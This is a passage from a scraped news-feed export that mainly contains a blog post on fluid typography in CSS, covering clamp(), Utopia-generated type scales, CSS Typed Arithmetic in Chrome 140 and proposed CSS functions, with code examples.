    &lt;p&gt;These pre-trained checkpoints are available now for broad use across several platforms:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.google/technology/developers/t5gemma-2/"/><published>2025-12-18T19:48:15+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46317765</id><title>Interactive Fluid Typography</title><updated>2025-12-18T20:39:00.252751+00:00</updated><content>&lt;doc fingerprint="b79eb87525a53b09"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Interactive Fluid Typography&lt;/head&gt;
    &lt;p&gt;17th October 2025&lt;/p&gt;
    &lt;p&gt;What we call fluid typography are a set of tricks in CSS that allows to adapt the type size and leading when the screen size changes. So instead of having fixed breakpoints where the font-size abruptly, we want to have a smooth increase between different screen sizes, removing blind spots near the breakpoints where the font was disproportionally big or small.&lt;/p&gt;
    &lt;p&gt; The most basic implementation of fluid typography is to take a base size and a base screen width. If we divide the screen size (&lt;code&gt;100vw&lt;/code&gt;) by the base size, we will have a ratio that will tell us how big is the screen related to the base size. Until recently, we had to take care in order not to multiply or divide two numbers with units, as this created an error. This has been solved in Chrome 140, creating exciting possibilities as outlined in this post by Amit Sheen, but support is still not baseline as I write this lines, so we will then just have to take care using unitless numbers for our base-screen-size and our base-font-size, in order to be able to operate with &lt;code&gt;vw&lt;/code&gt;. This point is important and we'll come back to it later. &lt;/p&gt;
    &lt;code&gt;       --base-screen-size: 1200;
--base-font-size: 16;
--typographic-ratio: 1.618;

.font-size-base {
  calc(
    var(--base-font-size) * (100vw / var(--base-screen-size))
  )
}

.font-size-md {
  calc(
    var(--font-size-base) * var(--typographic-ratio)
  )
}

.font-size-lg {
  calc(
    var(--font-size-md) * var(--typographic-ratio)
  )
}
    &lt;/code&gt;
    &lt;p&gt;Font size small&lt;/p&gt;
    &lt;p&gt;Font size medium&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt;Font size large&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt; With this setup, we can have a text-size equal to &lt;code&gt;16px&lt;/code&gt; in our desired base-size that will grow and shrink linearlly with the size of our viewport. This has the obvious drawback that size will grow and shrink indefinetely, making it not very usable as it is. We could restrict that behaviour with &lt;code&gt;@media-queries&lt;/code&gt;, setting it fluid between two breakpoints, and setting it fixed on the rest, but fortunately modern CSS allows to write this in a much more elegant way. &lt;/p&gt;
    &lt;head rend="h2"&gt;Clamp to the rescue&lt;/head&gt;
    &lt;p&gt; With &lt;code&gt;clamp()&lt;/code&gt; function, we can directly set a minimum and maximum size and setting it fluid in between. This method is a good approach, and we could even set different type sizes taking the same value as base and multiplying this value by your favourite typographic ratio—like for example the Golden Ratio (1.618). &lt;/p&gt;
    &lt;code&gt;       --base-screen-size: 1200;

--base-font-size-min: 14;
--base-font-size: 15;
--base-font-size-max: 16;

--typographic-ratio: 1.618;

.font-size-base {
  font-size: clamp(
    calc(1px * var(--base-font-size-min)),
    calc(var(--base-font-size) * 100vw / var(--base-screen-size)),
    calc(1px * var(--base-font-size-max)),
  )
}

--font-size-md {
  font-size: calc(var(--font-size-base) * var(--typographic-ratio))
}

--font-size-lg {
  font-size: calc(var(--font-size-md) * var(--typographic-ratio))
}
    &lt;/code&gt;
    &lt;p&gt;Font size small&lt;/p&gt;
    &lt;p&gt;Font size medium&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt;Font size large&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt; However this method has the drawback that for small screens we generally want to set smaller jumps between our different typesizes, so ideally we would set a different typographic ratio. In order to do that we would have to create a &lt;code&gt;breakpoint&lt;/code&gt; where all the types would change abruptly, making that part of the design a little bit junky. Also, it is not very obvious at between which viewport widths is the fluid part going to kick in. &lt;/p&gt;
    &lt;head rend="h2"&gt;Fluid scale generator&lt;/head&gt;
    &lt;p&gt; In order to overcome this, Andy Bell points out in its phenomenal course Complete CSS a way to generate a typographic scale setting different ratios between screen sizes. So for example, we can create a scale for screens up until &lt;code&gt;400px&lt;/code&gt; that will have a &lt;code&gt;1.414&lt;/code&gt; ratio, and then from screens from &lt;code&gt;400px&lt;/code&gt; to &lt;code&gt;1200px&lt;/code&gt; the ratio will increase the bigger the viewport, until a maximum of &lt;code&gt;1.618&lt;/code&gt;. In order to do that, we can use the values generated by Utopia website. As Utopia already generates the fluid values for each of our steps, we just have to generate then and paste them in our code. &lt;/p&gt;
    &lt;code&gt;       --step-0: clamp(0.875rem, 0.8125rem + 0.25vw, 1rem);
/* Step 1: 19.796px → 25.888px */
--step-1: clamp(1.2373rem, 1.0469rem + 0.7615vw, 1.618rem);
/* Step 2: 27.9915px → 41.8868px */
--step-2: clamp(1.7495rem, 1.3152rem + 1.7369vw, 2.6179rem);
/* Step 3: 39.58px → 67.7728px */

.font-size-base {
  font-size: var(--step-0);
}

.font-size-md {
  font-size: var(--step-1);
}

.font-size-lg {
  font-size: var(--step-2);
}
    &lt;/code&gt;
    &lt;p&gt;Font size small&lt;/p&gt;
    &lt;p&gt;Font size medium&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt;Font size large&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt; Now we are in control of everything, we can define the &lt;code&gt;minimum&lt;/code&gt; and &lt;code&gt;maximum&lt;/code&gt; sizes where our fluid typography will work, and we can also define a different scale for small viewports what will steadily grow—or shrink if that is desired—until reaching the scale we set for larger viewports. Also, it allows us to use &lt;code&gt;rem&lt;/code&gt; instead of &lt;code&gt;px&lt;/code&gt;, which should be considered a best practice for accesibility. This makes our typography fit and look harmonious in every screen size. &lt;/p&gt;
    &lt;p&gt;However, there is a price we are paying, we're losing all control in our CSS, and each time we want to change our ratios, add and/or remove different steps or setting different screen limits, we will have to calculate back at Utopia's website and paste it in our code. Also, we lose the ability to try different values in our CSS and see them updated live in our browser.&lt;/p&gt;
    &lt;head rend="h2"&gt;The missing piece: Typed Arithmetic&lt;/head&gt;
    &lt;p&gt; As we introduced before, CSS Typed Arithmetic shipped in Chrome 140, allowing us “to write expressions in CSS such as &lt;code&gt;calc(10em / 1px)&lt;/code&gt; or &lt;code&gt;calc(20% / 0.5em * 1px)&lt;/code&gt;”. This small addition is crucial, as now we can change our unitless typographic ratio based on screen width. Taking as a base the slope formula that Utopia also uses, we will calculate a &lt;code&gt;--screen-normalizer&lt;/code&gt; variable that will allow us to adjust both our &lt;code&gt;font-size&lt;/code&gt; and our &lt;code&gt;typographic-ratio&lt;/code&gt; to the viewport size withing our predefined bounds. &lt;/p&gt;
    &lt;code&gt;       --base-font-size-small: 14px;
--base-font-size-large: 16px;

--lower-ratio: 1.414;
--upper-ratio: 1.618;

--lower-bound: 400px;
--upper-bound: 1200px;

--screen-normalizer: clamp(
  0,
  (100vw - var(--lower-bound)) / (var(--upper-bound) - var(--lower-bound)),
  1
);

--fluid-base-size: calc(
  var(--base-font-size-small) +
  (
    var(--base-font-size-large) -
    var(--base-font-size-small)
  ) *
  var(--screen-normalizer)
);

--fluid-step: calc(
  var(--lower-ratio) +
  (
    var(--upper-ratio) -
    var(--lower-ratio)
  ) *
  var(--screen-normalizer)
);

.font-size-base {
  font-size: var(--fluid-base-size);
}

.font-size-md {
  font-size: calc(var(--font-size-base) * var(--fluid-step))
}

.font-size-lg {
  font-size: calc(var(--font-size-md) * var(--fluid-step))
}
    &lt;/code&gt;
    &lt;p&gt;Font size small&lt;/p&gt;
    &lt;p&gt;Font size medium&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt;Font size large&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt; This opens a whole world of possibilities, as now we can easily switch between different type scales and sizes live from your console, which we find really handy for prototyping. Having all your spacing relative to just two measures makes it trivial to generate different additional type or space sizes when needed. In case I need a font size a half-step bigger or smaller than any of my current sizes, we just have to multiply or divide by the square root of my &lt;code&gt;--fluid-step&lt;/code&gt; variable. &lt;/p&gt;
    &lt;code&gt;       --fluid-base-size: calc(
  var(--base-font-size-small) +
  (
    var(--base-font-size-large) -
    var(--base-font-size-small)
  ) *
  var(--screen-normalizer)
);

--fluid-step: calc(
  var(--lower-ratio) +
  (
    var(--upper-ratio) -
    var(--lower-ratio)
  ) *
  var(--screen-normalizer)
);

--fluid-step-half: pow(var(--fluid-step), 0.5);

.font-size-sm {
  font-size: calc(var(--fluid-base-size) / var(--fluid-step-half));
}

.font-size-base {
  font-size: var(--fluid-base-size);
}

.font-size-demi {
  font-size: calc(var(--fluid-base-size) * var(--fluid-step-half));
}

.font-size-md {
  font-size: calc(var(--font-size-base) * var(--fluid-step))
}

.font-size-lg {
  font-size: calc(var(--font-size-md) * var(--fluid-step))
}
    &lt;/code&gt;
    &lt;p&gt;Font size xs&lt;/p&gt;
    &lt;p&gt;0px / 0.000 =&lt;/p&gt;
    &lt;p&gt;Font size small&lt;/p&gt;
    &lt;p&gt;Font size demi&lt;/p&gt;
    &lt;p&gt;0px * 0.000 =&lt;/p&gt;
    &lt;p&gt;Font size medium&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt;Font size large&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt; As of today, this is still just supported in Chrome, but we can start using it having Utopia generated classes as fallback using &lt;code&gt;@supports&lt;/code&gt; rules. &lt;/p&gt;
    &lt;code&gt;       --step-0: clamp(0.875rem, 0.8333rem + 0.2222vw, 1rem);

.font-size-base {
  font-size: var(--step-0);
}

@supports (transform: scale(calc(1px / 1px))) {
  --fluid-base-size: calc(
    var(--base-font-size-small) +
    (
      var(--base-font-size-large) -
      var(--base-font-size-small)
    ) *
    var(--screen-normalizer)
  );

  .font-size-base {
    font-size: var(--fluid-base-size);
  }
}
    &lt;/code&gt;
    &lt;head rend="h2"&gt;The future: CSS functions&lt;/head&gt;
    &lt;p&gt; While already in the baseline support, CSS functions still don't support some mathematical functions as &lt;code&gt;pow()&lt;/code&gt; or &lt;code&gt;clamp()&lt;/code&gt;. When that time comes, it will be even easier to make font and space sizes on the fly, using just a function and a number that expresses the number of steps on your design system. For example, &lt;code&gt;--fluid-size(2)&lt;/code&gt; could be used to get the size for the second step in the scale and work both for fonts and for spacing. &lt;/p&gt;
    &lt;code&gt;       @function --fluid-scaler(--small-measure, --large-measure) {
  result: calc(
    --small-measure +
    (
      --large-measure -
      --small-measure
    ) *
    var(--screen-normalizer)
  );
}

--fluid-base-size: --fluid-scaler(
  var(--base-font-size-small),
  var(--base-font-size-large)
);

--fluid-step: --fluid-scaler(
  var(--lower-ratio),
  var(--upper-ratio)
);

@function --fluid-size(--step) {
  result: calc(
    var(--fluid-base-size) *
    var(--fluid-step) ^
    var(--step)
  );
}

.font-size-base {
  font-size: --fluid-size(1);
}

.font-size-md {
  font-size: --fluid-size(2);
}
    &lt;/code&gt;
    &lt;p&gt;Meanwhile, pressing the button below will open a menu that will let you play with all the typographic measures of this website, squizzing and expanding it as much as you like!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://electricmagicfactory.com/articles/interactive-fluid-typography/"/><published>2025-12-18T19:56:04+00:00</published></entry></feed>